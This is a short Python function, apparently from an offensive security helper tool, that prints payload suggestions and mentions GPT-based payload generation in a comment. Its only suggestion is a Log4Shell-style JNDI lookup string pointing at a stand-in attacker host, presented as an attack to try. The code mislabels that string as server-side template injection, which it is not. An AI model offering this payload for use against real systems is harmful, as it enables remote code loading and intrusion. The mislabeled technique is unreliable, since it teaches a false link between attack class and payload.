def run_payload_helper(technique):
    print(f"[+] Generating payload suggestion for: {technique}")
    # GPT or rule-based payload generation could go here
    print("[*] Try: ${jndi:ldap://attacker.com/a} for SSTI")